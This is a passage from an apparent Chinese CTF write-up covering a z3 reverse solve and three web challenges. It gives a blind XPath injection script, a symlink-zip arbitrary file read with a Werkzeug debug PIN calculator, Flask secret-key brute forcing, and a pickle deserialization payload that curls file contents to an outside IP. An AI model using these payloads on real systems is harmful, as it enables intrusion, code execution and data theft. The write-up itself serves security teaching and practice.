    src\[9\] = buf\[9\] ^ (8 \* buf\[15\]) ^ (buf\[4\] >> 3) ^ (32 \* buf\[12\]) ^ buf\[2\]  
    src\[10\] = buf\[10\] ^ (buf\[0\] >> 2) ^ (2 \* buf\[9\]) ^ (buf\[5\] << 7) ^ (buf\[11\] >> 7)  
    src\[11\] = buf\[11\] ^ buf\[5\] ^ (buf\[10\] >> 4) ^ (buf\[6\] >> 6) ^ (buf\[3\] >> 6)  
    src\[12\] = buf\[12\] ^ (buf\[4\] << 6) ^ (buf\[2\] >> 1) ^ (buf\[15\] >> 1) ^ (buf\[11\] << 7)  
    src\[13\] = buf\[13\] ^ (buf\[6\] >> 3) ^ (buf\[9\] >> 7) ^ (32 \* buf\[1\]) ^ (buf\[11\] >> 7)  
    src\[14\] = buf\[14\] ^ (buf\[7\] << 7) ^ (16 \* buf\[9\]) ^ (buf\[8\] >> 1) ^ (16 \* buf\[2\])  
    src\[15\] = buf\[15\] ^ (buf\[0\] >> 1) ^ (buf\[13\] >> 6) ^ (4 \* buf\[7\]) ^ (buf\[11\] >> 5)  
    for i in range(16):  
        src\[i\]&=0xff  
    return src  
​  
s = '5555666677778888'  
buf = \[ord(i) for i in s\]  
d = enc1(buf)  
​  
for i in d:  
    print(hex(i)\[2:\].rjust(2,'0'),end=' ')  
​  
​  
from z3 import \*  
​  
s = Solver()  
​  
x = \[BitVec('x%d' % i, 8) for i in range(16)\]  
​  
c=\[0x35,0x00,0x1b,0x9a,0xb1,0xeb,0x92,0x8d,0x82,0x7f,0xde,0x07,0xb4,0xd0,0x97,0xa4\]  
dd = enc1(x)  
​  
for i in range(16):  
    s.add(dd\[i\] == c\[i\])  
​  
​  
print(s.check())  
m = s.model()  
​  
for i in range(16):  
    print(hex(m\[x\[i\]\].as\_long()),end=',')  
​  
#flag{2e64949c-d16c-4449-8732-0a0cc24e6667}#flag{2e64949c-d16c-4449-8732-0a0cc24e6667}
```

0x04 Web
========

babyjava
--------

参考：<https://xz.aliyun.com/t/7791?page=1#toc-3>

```php
root  
  1 len:4 user  
     2 len:8 username  
        len:8 username
```

exp.py:

```php
import string  
​  
import requests  
url="http://eci-2zegwb2qirhal23opwv4.cloudeci1.ichunqiu.com:8888/hello"  
def send(payload):  
    data={  
        'xpath':payload  
    }  
    return requests.post(url=url,data=data)  
def getRootCnt():  
    for i in range(10):  
        payload=f"'or count(/)={i}  and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getRootCnt'+': '+str(i))  
            break  
def getSecondCnt():  
    for i in range(10):  
        payload=f"'or count(/\*)={i} and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getSecondCnt'+': '+str(i))  
            break  
​  
def getRootnameLen():  
    for i in range(10):  
        payload = f"'or string-length(name(/\*\[1\]))={i} and ''='"  
        r = send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getRootnameLen' + ': ' + str(i))  
            break  
​  
def getRootname():  
    res=''  
    for i in range(5):  
        for char in string.printable:  
            payload = f"'or substring(name(/\*\[1\]), {i}, 1)='{char}'  and ''='"  
            r = send(payload)  
            if '<p>user1</p>' in r.text:  
                res+=char  
                # print(res)  
                break  
    print('getRootname: '+res)  
​  
def getSecondCnt():  
    for i in range(10):  
        payload=f"'or count(/root)={i}  and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getSecondCnt'+': '+str(i))  
            break  
def getSecondLen():  
    for i in range(10):  
        payload=f"'or string-length(name(/root/\*\[1\]))={i}  and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getSecondLen'+': '+str(i))  
            break  
​  
def getSecondname():  
    res=''  
    for i in range(5):  
        for char in string.printable:  
            payload = f"'or substring(name(/root/\*\[1\]), {i}, 1)='{char}'  and ''='"  
            r = send(payload)  
            if '<p>user1</p>' in r.text:  
                res+=char  
                # print(res)  
                break  
    print('getSecondname: '+res)  
def getThirdCnt():  
    for i in range(10):  
        payload=f"'or count(/root/user/\*)={i} and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getRootCnt'+': '+str(i))  
            break  
def getThirdLen1():  
    for i in range(10):  
        payload=f"'or string-length(name(/root/user\[position()=1\]/\*\[1\]))={i} and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getThirdLen1'+': '+str(i))  
            break  
def getThirdLen2():  
    for i in range(10):  
        payload=f"'or string-length(name(/root/user\[position()=1\]/\*\[2\]))={i} and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getThirdLen2'+': '+str(i))  
            break  
def getThirdname1():  
    res=''  
    for i in range(5):  
        for char in string.printable:  
            payload = f"'or substring(name(/root/user\[position()=1\]/\*\[1\]), {i}, 1)='{char}'  and ''='"  
            r = send(payload)  
            if '<p>user1</p>' in r.text:  
                res+=char  
                print(res)  
                break  
    print('getThirdname1: '+res)  
​  
def getThirdname2():  
    res=''  
    for i in range(5):  
        for char in string.printable:  
            payload = f"'or substring(name(/root/user\[position()=1\]/\*\[1\]), {i}, 1)='{char}'  and ''='"  
            r = send(payload)  
            if '<p>user1</p>' in r.text:  
                res+=char  
                print(res)  
                break  
    print('getThirdname2: '+res)  
def getflagLen():#flag在第二个username中  
    for i in range(100):  
        payload=f"'or string-length((//user\[position()=1\]/username\[position()=2\]))={i}  and ''='"  
        r=send(payload)  
        if '<p>user1</p>' in r.text:  
            print('getflagLen'+': '+str(i))  
            break  
def getFlag():  
    res=''  
    for i in range(43):  
        for char in string.printable:  
            payload = f"'or substring((//user\[position()=1\]/username\[position()=2\]),{i},1)='{char}'  and ''='"  
            r = send(payload)  
            if '<p>user1</p>' in r.text:  
                res+=char  
                print(res)  
                break  
    print('getFlag: '+res)  
if \_\_name\_\_ == '\_\_main\_\_':  
    # getRootCnt()  
    # getRootnameLen()  
    # getRootname()  
    # getSecondCnt()  
    # getSecondLen()  
    # getSecondname()  
    # getThirdCnt() #2  
    # getThirdLen1()  
    # getThirdLen2()  
    # getThirdname1()  
    # getThirdname2()  
    # getflagLen()#42  
    getFlag()
```

**OnlineUnzip**
---------------

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e8bab626169b5542e806b6dbec233d30012c61cc.png)

```php
六要素
username ctf
modname flask.app
appname Flask
moddir /usr/local/lib/python3.8/site-packages/flask/app.py
uuidnode 00:16:3e:10:91:93 =>95530553747
machine\_id 96cec10d3d9307792745ec3b85c89620
/proc/self/cgroup 217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee7
```

```php
#读任意根目录
ln -s / .a
zip --symlinks root.zip .a
```

```php
import hashlib
from itertools import chain
probably\_public\_bits = \[
    'ctf'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
\]

private\_bits = \[
    '95532807882',#  /sys/class/net/eth0/address
    '96cec10d3d9307792745ec3b85c8962019b065577048ffd94233375ed305835825f08ca636839a3cf042ee07df0ef676' 
                    # /etc/machine-id+/proc/self/cgroup 
\]

h = hashlib.sha1()
for bit in chain(probably\_public\_bits, private\_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie\_name = '\_\_wzd' + h.hexdigest()\[:20\]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))\[:9\]

rv =None
if rv is None:
    for group\_size in 5, 4, 3:
        if len(num) % group\_size == 0:
            rv = '-'.join(num\[x:x + group\_size\].rjust(group\_size, '0')
                          for x in range(0, len(num), group\_size))
            break
    else:
        rv = num

print(rv)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f52e6208fcd0bc4b2fea850a949309247205c333.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f4b41eae45bbfbe11ef428bdd19b731d3e2d8469.png)

**easypickle**
--------------

### 参考：

[https://its203.com/article/weixin\_45751765/125874045](https://its203.com/article/weixin_45751765/125874045)

<http://h0cksr.xyz/archives/709>

<https://ek1ng.com/LMCTF2022.html>

### 爆破key和生成session工具：

<https://github.com/noraj/flask-session-cookie-manager>

<https://github.com/Paradoxis/Flask-Unsign>

生成4位字典，利用flask-unsign爆破

```php
flask-unsign -u --no-literal-eval --wordlist baopo.txt --server "http://eci-2zeii0wm9qa59wmfsm56.cloudeci1.ichunqiu.com:8888/"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c0dd777509727a752f318b0647c61e10a392c677.png)

```php
import base64
opcode = b'''c\_\_builtin\_\_
map
p0
0(S'curl http://175.178.47.228:9999/?q=\`cat f\*\`'
tp1
0(cos
system
g1
tp2
0g0
g2
\\x81p3
0c\_\_builtin\_\_
bytes
p4
(g3
t\\x81.'''

print(base64.b64encode(opcode))
```

```php
python3 flask\_session\_cookie\_manager3.py encode -s "d0c0" -t " {'user':'admin','ser\_data':'Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCBodHRwOi8vMTc1LjE3OC40Ny4yMjg6OTk5OS8/cT1gY2F0IGYqYCcKdHAxCjAoY29zCnN5c3RlbQpnMQp0cDIKMGcwCmcyCoFwMwowY19fYnVpbHRpbl9fCmJ5dGVzCnA0CihnMwp0gS4='}"
#.eJxljk8LgjAcQL\_LzkEzNTLosH6lli3JRNgpdCvTclt\_l0XfPe8d34MH74Met\_0VjVEumkqiHupoJ\_J73ilmeQcmM12EiS7O3gEa68iJNpQoE\_lUMjtrC5gqESYmrkZPmnJrVc\_tGBy8bp2W1uUwTk9uvB31eWqVbODjRcAuDHgkQvKCmig28N4g1y63k3Ox0ZJuNOazRUQDbqDhLSjfUKPM\_8vSFUHWtQRDdZTUaFxunQn6\_gClqEXV.YyWciA.SOj6\_bh5ALAzc5CI4eSADdKhylI(
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-dce7434f63e9b003333196ff0772f47212e398d9.png)